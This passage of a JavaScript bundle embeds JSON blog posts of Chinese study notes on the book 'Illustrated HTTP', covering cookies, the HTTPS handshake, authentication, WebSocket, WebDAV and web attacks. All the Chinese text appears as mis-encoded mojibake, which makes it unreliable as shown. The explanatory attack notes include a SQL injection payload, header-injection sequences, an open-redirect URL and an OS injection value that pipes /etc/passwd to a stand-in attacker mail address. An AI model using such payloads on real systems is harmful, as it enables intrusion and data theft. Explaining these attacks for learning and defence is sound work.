çš„æœ‰æ•ˆæœŸï¼ˆè‹¥ä¸æ˜ç¡®æŒ‡å®šåˆ™é»˜è®¤ä¸ºæµè§ˆå™¨å…³é—­å‰ä¸ºæ­¢ï¼‰</td>\\n</tr>\\n<tr>\\n<td>path=PATH</td>\\n<td>å°†æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ç›®å½•ä½œä¸ºCookieçš„é€‚ç”¨å¯¹è±¡ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºæ–‡æ¡£æ‰€åœ¨çš„æ–‡ä»¶ç›®å½•ï¼‰</td>\\n</tr>\\n<tr>\\n<td>domain=åŸŸå</td>\\n<td>ä½œä¸º Cookie é€‚ç”¨å¯¹è±¡çš„åŸŸå ï¼ˆè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºåˆ›å»º Cookieçš„æœåŠ¡å™¨çš„åŸŸåï¼‰</td>\\n</tr>\\n<tr>\\n<td>Secure</td>\\n<td>ä»…åœ¨ HTTPS å®‰å…¨é€šä¿¡æ—¶æ‰ä¼šå‘é€ Cookie</td>\\n</tr>\\n<tr>\\n<td>HttpOnly</td>\\n<td>åŠ ä»¥é™åˆ¶ï¼Œä½¿ Cookie ä¸èƒ½è¢« JavaScript è„šæœ¬è®¿é—®</td>\\n</tr>\\n</tbody></table>\\n<ul>\\n<li><p>Cookieï¼šstatus=enable</p>\\n</li>\\n<li><p>DNTï¼šå±äº HTTP è¯·æ±‚é¦–éƒ¨ï¼Œä¸º<code>1</code>æ‹’ç»ä¸ªäººä¿¡æ¯è¢«å¾é›†ï¼Œ<code>0</code>å…è®¸ã€‚</p>\\n</li>\\n</ul>\\n<hr>\\n<p>HTTP çš„ä¸è¶³</p>\\n<ul>\\n<li>é€šä¿¡ä½¿ç”¨æ˜æ–‡ï¼ˆä¸åŠ å¯†ï¼‰ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬<ul>\\n<li>TCP/IP æ˜¯å¯èƒ½è¢«çªƒå¬çš„ç½‘ç»œï¼ˆå³ä¾¿ä¸ä½¿ç”¨æ˜æ–‡ï¼‰</li>\\n<li>é€šä¿¡çš„åŠ å¯† ï¼ˆHTTPS)</li>\\n<li>å†…å®¹çš„åŠ å¯† ï¼ˆåŒæ–¹éƒ½å…·æœ‰åŠ å¯†è§£å¯†èƒ½åŠ›ï¼‰</li>\\n</ul>\\n</li>\\n<li>ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œå› æ­¤æœ‰å¯èƒ½é­é‡ä¼ªè£…<ul>\\n<li>ä»»ä½•äººéƒ½å¯å‘èµ·è¯·æ±‚</li>\\n<li>HTTPSå¯ä»¥ç¡®è®¤å¯¹æ–¹çš„è¯ä¹¦</li>\\n</ul>\\n</li>\\n<li>æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥æœ‰å¯èƒ½å·²é­ç¯¡æ”¹<ul>\\n<li>æ¥æ”¶åˆ°çš„å†…å®¹å¯èƒ½æœ‰è¯¯ï¼ˆä¸­é—´äººæ”»å‡»ï¼‰</li>\\n</ul>\\n</li>\\n</ul>\\n<hr>\\n<p>SSLé‡‡ç”¨<code>å…¬é’¥</code>å’Œ<code>ç§é’¥</code></p>\\n<p>HTTPS é‡‡ç”¨æ··åˆåŠ å¯†æœºåˆ¶(SSL+HTTP)</p>\\n<p>æœºåˆ¶å‰æï¼šå…¬å¼€å¯†é’¥åŠ å¯†ä¸å…±äº«å¯†é’¥åŠ å¯†ç›¸æ¯”ï¼Œå…¶å¤„ç†é€Ÿåº¦è¦æ…¢</p>\\n<ol>\\n<li>åœ¨äº¤æ¢å¯†é’¥ï¼ˆå…±äº«å¯†é’¥ï¼‰ç¯èŠ‚ä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†æ–¹å¼</li>\\n<li>ä¹‹åçš„å»ºç«‹é€šä¿¡äº¤æ¢æŠ¥æ–‡é˜¶æ®µåˆ™ä½¿ç”¨å…±äº«å¯†é’¥åŠ å¯†æ–¹å¼</li>\\n</ol>\\n<hr>\\n<p>åœ¨ä½¿ç”¨å…¬é’¥åŠ å¯†ä¹‹å‰ï¼Œå¦‚ä½•ç¡®ä¿æ¥æ”¶åˆ°çš„å…¬é’¥æ˜¯æ­£ç¡®çš„</p>\\n<ol>\\n<li>å…¬é’¥æ”¾ç½®åœ¨å…¬é’¥è¯ä¹¦ï¼ˆæ•°å­—è¯ä¹¦ï¼‰å†…éƒ¨ã€‚</li>\\n<li>æµè§ˆå™¨å†…ç½®äº†å¸¸ç”¨ç¬¬ä¸‰æ–¹è®¤è¯çš„å…¬å¼€å¯†é’¥ï¼ˆç”¨äºå¯¹æ•°å­—è¯ä¹¦è¿›è¡Œæ ¡éªŒï¼‰ã€‚</li>\\n</ol>\\n<hr>\\n<p>å¯è¯æ˜ç»„ç»‡çœŸå®æ€§çš„ EV SSL è¯ä¹¦</p>\\n<hr>\\n<p>å®¢æˆ·ç«¯è¯ä¹¦</p>\\n<p>éœ€è¦è´¹ç”¨ï¼Œç”¨äºç‰¹æ®Šç”¨é€”çš„ä¸šåŠ¡ï¼Œä¾‹å¦‚ç½‘é“¶ã€‚</p>\\n<hr>\\n<p>HTTPS çš„å®‰å…¨é€šä¿¡æœºåˆ¶</p>\\n<ol>\\n<li><p>å®¢æˆ·ç«¯é€šè¿‡å‘é€ Client Hello æŠ¥æ–‡å¼€å§‹ SSL é€šä¿¡ã€‚æŠ¥æ–‡ä¸­åŒ…å«å®¢æˆ·ç«¯æ”¯æŒçš„ SSL çš„æŒ‡å®šç‰ˆæœ¬ã€\\nåŠ å¯†ç»„ä»¶ï¼ˆCipher Suiteï¼‰åˆ—è¡¨ï¼ˆæ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•åŠå¯†é’¥é•¿åº¦ç­‰ï¼‰ã€‚</p>\\n<p> æ€»ç»“ï¼š(åå•†åŠ å¯†ç»„ä»¶ï¼ŒéªŒè¯SSLç‰ˆæœ¬)</p>\\n</li>\\n<li><p>æœåŠ¡å™¨å¯è¿›è¡Œ SSL é€šä¿¡æ—¶ï¼Œä¼šä»¥ Server Hello æŠ¥æ–‡ä½œä¸ºåº”ç­”ã€‚å’Œå®¢æˆ·ç«¯ä¸€æ ·ï¼Œ\\nåœ¨æŠ¥æ–‡ä¸­åŒ…å« SSL ç‰ˆæœ¬ä»¥åŠåŠ å¯†ç»„ä»¶ã€‚æœåŠ¡å™¨çš„åŠ å¯†ç»„ä»¶å†…å®¹æ˜¯ä»æ¥æ”¶åˆ°çš„å®¢æˆ·ç«¯åŠ å¯†ç»„ä»¶å†…ç­›é€‰å‡ºæ¥çš„ã€‚</p>\\n<p> æ€»ç»“ï¼šå›åº”SSLç‰ˆæœ¬ï¼Œç¡®è®¤åŠ å¯†ç»„ä»¶</p>\\n</li>\\n<li><p>ä¹‹åæœåŠ¡å™¨å‘é€ Certificate æŠ¥æ–‡ã€‚æŠ¥æ–‡ä¸­åŒ…å«å…¬å¼€å¯†é’¥è¯ä¹¦ã€‚</p>\\n<p> æ€»ç»“ï¼šå‘ç”Ÿå…¬é’¥è¯ä¹¦ï¼ˆåŒ…å«å…¬é’¥ï¼‰</p>\\n</li>\\n<li><p>æœ€åæœåŠ¡å™¨å‘é€ Server Hello Done æŠ¥æ–‡é€šçŸ¥å®¢æˆ·ç«¯ï¼Œæœ€åˆé˜¶æ®µçš„ SSL æ¡æ‰‹åå•†éƒ¨åˆ†ç»“æŸã€‚</p>\\n</li>\\n<li><p>SSL ç¬¬ä¸€æ¬¡æ¡æ‰‹ç»“æŸä¹‹åï¼Œå®¢æˆ·ç«¯ä»¥ Client Key Exchange æŠ¥æ–‡ä½œä¸ºå›åº”ã€‚\\næŠ¥æ–‡ä¸­åŒ…å«é€šä¿¡åŠ å¯†ä¸­ä½¿ç”¨çš„ä¸€ç§è¢«ç§°ä¸º Pre-master secret çš„éšæœºå¯†ç ä¸²ã€‚\\nè¯¥æŠ¥æ–‡å·²ç”¨æ­¥éª¤ 3 ä¸­çš„å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚</p>\\n<p> æ€»ç»“ï¼šå¯¹å…±äº«å¯†é’¥ä½¿ç”¨å…¬é’¥åŠ å¯†å¹¶ä¸”å‘é€</p>\\n</li>\\n<li><p>æ¥ç€å®¢æˆ·ç«¯ç»§ç»­å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡ä¼šæç¤ºæœåŠ¡å™¨ï¼Œ\\nåœ¨æ­¤æŠ¥æ–‡ä¹‹åçš„é€šä¿¡ä¼šé‡‡ç”¨ Pre-master secret å¯†é’¥åŠ å¯†ã€‚</p>\\n<p> æ€»ç»“ï¼šæç¤ºå‡†å¤‡è¿›è¡Œå…±äº«å¯†é’¥åŠ å¯†ï¼ˆé€Ÿåº¦å¿«ï¼‰</p>\\n</li>\\n<li><p>å®¢æˆ·ç«¯å‘é€ Finished æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡åŒ…å«è¿æ¥è‡³ä»Šå…¨éƒ¨æŠ¥æ–‡çš„æ•´ä½“æ ¡éªŒå€¼ã€‚\\nè¿™æ¬¡æ¡æ‰‹åå•†æ˜¯å¦èƒ½å¤ŸæˆåŠŸï¼Œè¦ä»¥æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿæ­£ç¡®è§£å¯†è¯¥æŠ¥æ–‡ä½œä¸ºåˆ¤å®šæ ‡å‡†ã€‚</p>\\n<p> æ€»ç»“ï¼šæœ€åä¸€æ¬¡æ€»éªŒè¯</p>\\n</li>\\n<li><p>æœåŠ¡å™¨åŒæ ·å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚</p>\\n</li>\\n<li><p>æœåŠ¡å™¨åŒæ ·å‘é€ Finished æŠ¥æ–‡ã€‚</p>\\n<p> æ€»ç»“ï¼šç¡®è®¤ä½¿ç”¨å…±äº«å¯†é’¥åŠ å¯†ï¼Œä¸‰æ¬¡æ¡æ‰‹ç»“æŸ</p>\\n</li>\\n<li><p>æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ Finished æŠ¥æ–‡äº¤æ¢å®Œæ¯•ä¹‹åï¼ŒSSL è¿æ¥å°±ç®—å»ºç«‹å®Œæˆã€‚\\nå½“ç„¶ï¼Œé€šä¿¡ä¼šå—åˆ° SSL çš„ä¿æŠ¤ã€‚ä»æ­¤å¤„å¼€å§‹è¿›è¡Œåº”ç”¨å±‚åè®®çš„é€šä¿¡ï¼Œå³å‘é€ HTTP è¯·æ±‚ã€‚</p>\\n</li>\\n<li><p>åº”ç”¨å±‚åè®®é€šä¿¡ï¼Œå³å‘é€ HTTP å“åº”ã€‚</p>\\n<p>æ€»ç»“ï¼šåç»­ç›´æ¥HTTPåè®®é€šä¿¡ï¼ˆä½¿ç”¨å…±äº«å¯†é’¥ï¼‰</p>\\n</li>\\n<li><p>æœ€åç”±å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ã€‚æ–­å¼€è¿æ¥æ—¶ï¼Œå‘é€ close_notify æŠ¥æ–‡ã€‚</p>\\n</li>\\n</ol>\\n<hr>\\n<p>BASICè®¤è¯</p>\\n<p>æ˜æ–‡å‘é€è´¦å·å¯†ç ï¼Œéå¸¸ä¸å®‰å…¨ã€‚</p>\\n<p>DIGESTè®¤è¯</p>\\n<p>å‘é€é€šè¿‡<code>è´¨è¯¢ç </code>è®¡ç®—ç”Ÿæˆçš„<code>å“åº”ç </code>éªŒè¯ã€‚</p>\\n<p>SSL å®¢æˆ·ç«¯è®¤è¯</p>\\n<p>é€šè¿‡å®¢æˆ·ç«¯è¯ä¹¦(å†…å«å…¬é’¥)è¿›è¡ŒSSLå®‰å…¨è®¤è¯</p>\\n<ul>\\n<li><p>è¯ä¹¦è®¤è¯(ä¾‹å¦‚éªŒè¯ç½‘é“¶è¯ä¹¦ï¼Œç¡®è®¤å®¢æˆ·ç«¯)</p>\\n</li>\\n<li><p>åŸºäºè¡¨å•è®¤è¯(ä¾‹å¦‚ç™»å½•è¡¨å•ï¼Œè¾“å…¥ç½‘é“¶å¯†ç ï¼Œç¡®è®¤æœ¬äººæ“ä½œ)</p>\\n<ul>\\n<li>åŸºäº<code>cookie</code>ä¿å­˜ä¸Šä¸€æ¬¡éªŒè¯ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦æœ¬äººæ“ä½œ</li>\\n</ul>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-26","timeArr":[2018,10,26,0,0,0,0],"title":"å›¾è§£Httpå¤§çº²ç¬”è®°(2)","uuid":"6b947579be3958bc587abb5535d818129ff810da","summary":"<p>å®ä½“é¦–éƒ¨å­—æ®µ</p>\\n<ul>\\n<li>Content-Encodingï¼šå®ä½“ç¼–ç æ–¹å¼(gzip, compress, deflate, identity)</li>\\n<li>Content-Locationï¼šæŠ¥æ–‡ä¸»ä½“è¿”å›èµ„æºå¯¹åº”çš„ URI(ä¸ä¸€å®šæ˜¯è¯·æ±‚URI)ã€‚</li>\\n<li>Content-Rangeï¼šåŒ¹é…éƒ¨åˆ†ã€‚</li>\\n<li>Content-Typeï¼šå®ä½“å†…å¯¹è±¡çš„åª’...</li>\\n</ul>","slug":"tu-jie-Http-da-gang-bi-ji-(2)","sha":"ad5b165bf43fc96f65189cf43aad4253aafc6b16"}')},648:function(n){n.exports=JSON.parse('{"content":"<p>HTTPçš„ç“¶é¢ˆ</p>\\n<ul>\\n<li>ä¸€æ¡è¿æ¥ä¸Šåªå¯å‘é€ä¸€ä¸ªè¯·æ±‚ã€‚</li>\\n<li>è¯·æ±‚åªèƒ½ä»å®¢æˆ·ç«¯å¼€å§‹ã€‚å®¢æˆ·ç«¯ä¸å¯ä»¥æ¥æ”¶é™¤å“åº”ä»¥å¤–çš„æŒ‡ä»¤ã€‚</li>\\n<li>è¯·æ±‚ / å“åº”é¦–éƒ¨æœªç»å‹ç¼©å°±å‘é€ã€‚é¦–éƒ¨ä¿¡æ¯è¶Šå¤šå»¶è¿Ÿè¶Šå¤§ã€‚</li>\\n<li>å‘é€å†—é•¿çš„é¦–éƒ¨ã€‚æ¯æ¬¡äº’ç›¸å‘é€ç›¸åŒçš„é¦–éƒ¨é€ æˆçš„æµªè´¹è¾ƒå¤šã€‚</li>\\n<li>å¯ä»»æ„é€‰æ‹©æ•°æ®å‹ç¼©æ ¼å¼ã€‚éå¼ºåˆ¶å‹ç¼©å‘é€ã€‚</li>\\n</ul>\\n<p>è§£å†³æ–¹æ³•ï¼š</p>\\n<ol>\\n<li>Ajax (å±€éƒ¨æ›´æ–°)</li>\\n<li>Comet (å»¶è¿Ÿå“åº”ï¼Œè¯·æ±‚äº†æŒ‚èµ·ï¼Œç­‰æœ‰æ›´æ–°å†å“åº”)</li>\\n</ol>\\n<hr>\\n<p>WebSocket</p>\\n<ul>\\n<li><p>æ¨é€åŠŸèƒ½ï¼šæœåŠ¡å™¨æ¨é€ç»™å®¢æˆ·ç«¯</p>\\n</li>\\n<li><p>å‡å°‘é€šä¿¡é‡</p>\\n<ol>\\n<li>ä¿æŒè¿æ¥çŠ¶æ€</li>\\n<li>æ¡æ‰‹è¯·æ±‚ï¼š<ul>\\n<li>è¯·æ±‚å¤´å­—æ®µ<code>Upgrade: websocket</code></li>\\n<li>è¯·æ±‚å¤´å­—æ®µ<code>Sec-WebSocket-Key</code>ï¼šæ¡æ‰‹è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„é”®å€¼</li>\\n</ul>\\n</li>\\n<li>æ¡æ‰‹å“åº”ï¼š<ul>\\n<li>å“åº”çŠ¶æ€ç <code>101 Switching Protocols</code></li>\\n<li>å“åº”å­—æ®µ<code>Sec-WebSocket-Accept</code>ï¼šæ ¹æ®<code>Sec-WebSocket-Key</code>ç”Ÿæˆ</li>\\n</ul>\\n</li>\\n</ol>\\n</li>\\n</ul>\\n<hr>\\n<p>Web æœåŠ¡å™¨ç®¡ç†æ–‡ä»¶çš„ WebDAV</p>\\n<p>æ˜¯ä¸€ä¸ªå¯å¯¹ Web æœåŠ¡å™¨ä¸Šçš„å†…å®¹ç›´æ¥è¿›è¡Œæ–‡ä»¶å¤åˆ¶ã€ç¼–è¾‘ç­‰æ“ä½œçš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ</p>\\n<p>ä¸€äº›æ¦‚å¿µ</p>\\n<ul>\\n<li>é›†åˆï¼ˆCollectionï¼‰ï¼šæ˜¯ä¸€ç§ç»Ÿä¸€ç®¡ç†å¤šä¸ªèµ„æºçš„æ¦‚å¿µã€‚ä»¥é›†åˆä¸ºå•ä½å¯è¿›è¡Œå„ç§æ“ä½œã€‚ä¹Ÿå¯å®ç°ç±»ä¼¼é›†åˆçš„é›†åˆè¿™æ ·çš„å åŠ ã€‚</li>\\n<li>èµ„æºï¼ˆResourceï¼‰ï¼šæŠŠæ–‡ä»¶æˆ–é›†åˆç§°ä¸ºèµ„æºã€‚</li>\\n<li>å±æ€§ï¼ˆPropertyï¼‰ï¼šå®šä¹‰èµ„æºçš„å±æ€§ã€‚å®šä¹‰ä»¥â€œåç§° = å€¼â€çš„æ ¼å¼æ‰§è¡Œã€‚</li>\\n<li>é”ï¼ˆLockï¼‰ï¼šæŠŠæ–‡ä»¶è®¾ç½®æˆæ— æ³•ç¼–è¾‘çŠ¶æ€ã€‚å¤šäººåŒæ—¶ç¼–è¾‘æ—¶ï¼Œå¯é˜²æ­¢åœ¨åŒä¸€æ—¶é—´è¿›è¡Œå†…å®¹å†™å…¥ã€‚</li>\\n</ul>\\n<hr>\\n<p>WebDAV ä¸ºå®ç°è¿œç¨‹æ–‡ä»¶ç®¡ç†ï¼Œå‘ HTTP/1.1 ä¸­è¿½åŠ äº†ä»¥ä¸‹è¿™äº›æ–¹æ³•</p>\\n<ul>\\n<li>PROPFIND ï¼šè·å–å±æ€§</li>\\n<li>PROPPATCH ï¼šä¿®æ”¹å±æ€§</li>\\n<li>MKCOL ï¼šåˆ›å»ºé›†åˆ</li>\\n<li>COPY ï¼šå¤åˆ¶èµ„æºåŠå±æ€§</li>\\n<li>MOVE ï¼šç§»åŠ¨èµ„æº</li>\\n<li>LOCK ï¼šèµ„æºåŠ é”</li>\\n<li>UNLOCK ï¼šèµ„æºè§£é”</li>\\n</ul>\\n<p>ä¸ºé…åˆæ‰©å±•çš„æ–¹æ³•ï¼ŒçŠ¶æ€ç ä¹Ÿéšä¹‹æ‰©å±•ã€‚</p>\\n<ul>\\n<li>102 Processing ï¼šå¯æ­£å¸¸å¤„ç†è¯·æ±‚ï¼Œä½†ç›®å‰æ˜¯å¤„ç†ä¸­çŠ¶æ€</li>\\n<li>207 Multi-Status ï¼šå­˜åœ¨å¤šç§çŠ¶æ€</li>\\n<li>422 Unprocessible Entity ï¼šæ ¼å¼æ­£ç¡®ï¼Œå†…å®¹æœ‰è¯¯</li>\\n<li>423 Locked ï¼šèµ„æºå·²è¢«åŠ é”</li>\\n<li>424 Failed Dependency ï¼šå¤„ç†ä¸æŸè¯·æ±‚å…³è”çš„è¯·æ±‚å¤±è´¥ï¼Œå› æ­¤ä¸å†ç»´æŒä¾èµ–å…³ç³»</li>\\n<li>507 Insufficient Storage ï¼šä¿å­˜ç©ºé—´ä¸è¶³</li>\\n</ul>\\n<hr>\\n<ul>\\n<li><p>XSSæ”»å‡»</p>\\n</li>\\n<li><p>SQLæ³¨å…¥æ”»å‡»</p>\\n<p>   ä¾‹å­ï¼š</p>\\n<p>   URL çš„æŸ¥è¯¢å­—æ®µå·²æŒ‡å®š <code>xxx.com/?q= ä¸Šé‡å®£</code>ï¼Œè¿™ä¸ªå€¼ç”± Web åº”ç”¨ä¼ å…¥åˆ°SQL è¯­å¥ä¸­ï¼Œæ„æˆä¸‹æ–¹çš„ SQL è¯­å¥ã€‚</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author = &#39;ä¸Šé‡å®£&#39; and flag = 1;</code></p>\\n<p>   æ³¨å…¥ï¼š</p>\\n<p>   æŸ¥è¯¢å­—æ®µçš„<code>ä¸Šé‡å®£</code>æ”¹å†™æˆ<code>ä¸Šé‡å®£&#39;--</code>ï¼Œæ‰§è¡Œä»¥ä¸‹SQL(<code>--</code>è¡¨ç¤ºä¹‹åæ˜¯æ³¨é‡Š)</p>\\n<p>   <code>SELECT * FROM bookTbl WHERE author =&#39;ä¸Šé‡å®£&#39; --&#39; and flag=1;</code></p>\\n<ul>\\n<li><p>OS æ³¨å…¥æ”»å‡»</p>\\n<p>ä¸€æ®µå’¨è¯¢è¡¨å•ä»£ç ï¼Œä¼šè·å–ç”¨æˆ·å¡«å†™çš„é‚®ç®±ï¼Œè‡ªåŠ¨å‘é€ä¸€å°é‚®ä»¶ã€‚</p>\\n<pre><code><pre class=\\"hljs\\"><code>my $adr = $q-&gt;param(\'mailaddress\');\\nopen(MAIL, &quot;| /usr/sbin/sendmail $adr&quot;);\\nprint MAIL &quot;From: info@example.com\\\\n&quot;;</code></pre></code></pre><p>æ”»å‡»è€…å°†ä¸‹é¢çš„å€¼æŒ‡å®šä½œä¸ºé‚®ä»¶åœ°å€</p>\\n<p><code>; cat /etc/passwd | mail hack@example.jp</code></p>\\n<p>æ”»å‡»è€…çš„è¾“å…¥å€¼ä¸­å«æœ‰åˆ†å·<code>;</code>ã€‚è¿™ä¸ªç¬¦å·åœ¨ OS å‘½ä»¤ä¸­ï¼Œä¼šè¢«è§£æä¸ºåˆ†éš”å¤šä¸ªæ‰§è¡Œå‘½ä»¤çš„æ ‡è®°</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»</p>\\n<p>  æœ‰äº›å“åº”ä¼šå°†è¯·æ±‚çš„ä¸€éƒ¨åˆ†ä½œä¸ºå“åº”é¦–éƒ¨å­—æ®µå€¼ã€‚</p>\\n<p>  HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»ï¼ˆHTTP Header Injectionï¼‰æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡åœ¨å“åº”é¦–éƒ¨å­—æ®µå†…æ’å…¥æ¢è¡Œ<code>%0D%0A</code>ï¼Œæ·»åŠ ä»»æ„å“åº”é¦–éƒ¨æˆ–ä¸»ä½“çš„ä¸€ç§æ”»å‡»</p>\\n<p>  HTTP é¦–éƒ¨æ³¨å…¥æ”»å‡»æœ‰å¯èƒ½ä¼šé€ æˆä»¥ä¸‹ä¸€äº›å½±å“ã€‚</p>\\n<ul>\\n<li>è®¾ç½®ä»»ä½• Cookie ä¿¡æ¯</li>\\n<li>é‡å®šå‘è‡³ä»»æ„ URL</li>\\n<li>æ˜¾ç¤ºä»»æ„çš„ä¸»ä½“ï¼ˆHTTP å“åº”æˆªæ–­æ”»å‡»ï¼‰</li>\\n</ul>\\n</li>\\n<li><p>HTTP å“åº”æˆªæ–­æ”»å‡»</p>\\n<p>  æ’å…¥2ä¸ªæ¢è¡Œ<code>%0D%0A%0D%0A</code>ï¼Œä¼ªé€ æˆå“åº”ä¸»ä½“ã€‚</p>\\n</li>\\n<li><p>å¼€æ”¾é‡å®šå‘</p>\\n<p>  é‡å®šå‘å‚æ•°å†™åœ¨<code>URL</code>ä¸Šï¼Œå®¹æ˜“è¢«ç¯¡æ”¹</p>\\n<p>  <code>http://example.com/?redirect=http://hackr.jp</code></p>\\n</li>\\n<li><p>ä¼šè¯åŠ«æŒ( ç›—å–<code>sid</code>)</p>\\n<ul>\\n<li>é€šè¿‡éæ­£è§„çš„ç”Ÿæˆæ–¹æ³•æ¨æµ‹ä¼šè¯ ID</li>\\n<li>é€šè¿‡çªƒå¬æˆ– XSS æ”»å‡»ç›—å–ä¼šè¯ ID</li>\\n<li>é€šè¿‡ä¼šè¯å›ºå®šæ”»å‡»ï¼ˆSession Fixationï¼‰å¼ºè¡Œè·å–ä¼šè¯ ID</li>\\n</ul>\\n</li>\\n<li><p>è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ (CSRF)</p>\\n<p>  å¯èƒ½é€ æˆçš„å±å®³ï¼š</p>\\n<ul>\\n<li><p>åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™æ›´æ–°è®¾å®šä¿¡æ¯ç­‰</p>\\n</li>\\n<li><p>åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™è´­ä¹°å•†å“</p>\\n</li>\\n<li><p>åˆ©ç”¨å·²é€šè¿‡è®¤è¯çš„ç”¨æˆ·æƒé™åœ¨ç•™è¨€æ¿ä¸Šå‘è¡¨è¨€è®º</p>\\n<p>ä¾‹å­ï¼š</p>\\n<p>ç•™è¨€æ¿è¯„è®º<code>&lt;img src=&quot;æ¶æ„ä»£ç &quot; /&gt;</code></p>\\n<p>å…¶ä»–ç”¨æˆ·è®¿é—®ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œè¢«è·å–<code>cookie</code></p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<hr>\\n<p>é€šè¿‡ç½‘ç»œè¿›è¡Œå¯†ç è¯•é”™</p>\\n<ul>\\n<li><p>ç©·ä¸¾æ³•</p>\\n</li>\\n<li><p>å­—å…¸æ”»å‡»</p>\\n</li>\\n<li><p>å½©è™¹è¡¨</p>\\n<p>  <code>Rainbow Table</code>æ˜¯ç”±æ˜æ–‡å¯†ç åŠä¸ä¹‹å¯¹åº”çš„æ•£åˆ—å€¼æ„æˆçš„ä¸€å¼ æ•°æ®åº“è¡¨</p>\\n</li>\\n<li><p>ç‚¹å‡»åŠ«æŒ(UIä¼ªè£…)</p>\\n</li>\\n<li><p>DoS æ”»å‡»</p>\\n<p>  ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ DoS æ”»å‡»æ–¹å¼ã€‚</p>\\n<ul>\\n<li><p>é›†ä¸­åˆ©ç”¨è®¿é—®è¯·æ±‚é€ æˆèµ„æºè¿‡è½½ï¼Œèµ„æºç”¨å°½çš„åŒæ—¶ï¼Œå®é™…ä¸ŠæœåŠ¡ä¹Ÿå°±å‘ˆåœæ­¢çŠ¶æ€ã€‚</p>\\n</li>\\n<li><p>é€šè¿‡æ”»å‡»å®‰å…¨æ¼æ´ä½¿æœåŠ¡åœæ­¢ã€‚</p>\\n<p>å¤šå°è®¡ç®—æœºå‘èµ·çš„ DoS æ”»å‡»ç§°ä¸º DDoS æ”»å‡»</p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-29","timeArr":[2018,10,29,0,0,0,0],"title":"å›¾è§£Httpå¤§çº²ç¬”è®°(3)","uuid":"b0662d8a00fca2a154662ad07955d8c807636c91","summary":"<p>HTTPçš„ç“¶é¢ˆ</p>\\n<ul>\\n<li>ä¸€æ¡è¿æ¥ä¸Šåªå¯å‘é€ä¸€ä¸ªè¯·æ±‚ã€‚</li>\\n<li>è¯·æ±‚åªèƒ½ä»å®¢æˆ·ç«¯å¼€å§‹ã€‚å®¢æˆ·ç«¯ä¸å¯ä»¥æ¥æ”¶é™¤å“åº”ä»¥å¤–çš„æŒ‡ä»¤ã€‚</li>\\n<li>è¯·æ±‚ / å“åº”é¦–éƒ¨æœªç»å‹ç¼©å°±å‘é€ã€‚é¦–éƒ¨ä¿¡æ¯è¶Šå¤šå»¶è¿Ÿè¶Šå¤§ã€‚</li>\\n<li>å‘é€å†—é•¿çš„é¦–éƒ¨ã€‚æ¯æ¬¡äº’ç›¸å‘é€ç›¸åŒçš„é¦–éƒ¨é€ æˆçš„æµªè´¹è¾ƒå¤šã€‚</li>\\n<li>å¯ä»»æ„é€‰æ‹©æ•°æ®å‹ç¼©æ ¼å¼ã€‚éå¼ºåˆ¶å‹ç¼©å‘é€ã€‚</li>\\n</ul>\\n<p>è§£å†³æ–¹æ³•ï¼š</p>\\n<ol>\\n<li>Ajax (å±€éƒ¨...</li>\\n</ol>","slug":"tu-jie-Http-da-gang-bi-ji-(3)","sha":"fe5b6414904c9b660ed09bb3304c04df11fe2d88"}')},649:function(n){n.exports=JSON.parse('{"content":"<p>è°ƒç”¨<code>import()</code>æ‰§è¡ŒåŠ¨æ€åŠ è½½æ—¶ï¼Œå¦‚æœä½¿ç”¨å˜é‡æ¨¡æ¿è¿›è¡Œè¯·æ±‚ï¼Œä¼šæ½œåœ¨çš„è¯·æ±‚å½“å‰ç¡®å®šçš„è·¯å¾„ä¸‹çš„<strong>æ‰€æœ‰æ–‡ä»¶</strong>ï¼</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>ç°åœ¨æœ‰å¦‚ä¸‹æ–‡ä»¶ç»“æ„ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---asset\\n  |---blog\\n    |---tech\\n      |---001.json\\n      |---002.json\\n      |---003.json\\n      ...\\n    |---essay\\n      |---001.json\\n      |---002.json\\n      |---003.json\\n      ...\\n  |---img\\n    |---a.png\\n    |---b.png</code></pre></code></pre><p>ç°åœ¨æƒ³<code>import</code>æ–‡ä»¶å¤¹<code>tech</code>å†…éƒ¨çš„æ‰€æœ‰æ–‡ç« ï¼Œå¦‚æœé‡Œé¢æœ‰100ç¯‡ï¼Œå¯ä»¥è€ƒè™‘<code>lazy-once</code>ï¼Œè¿™æ 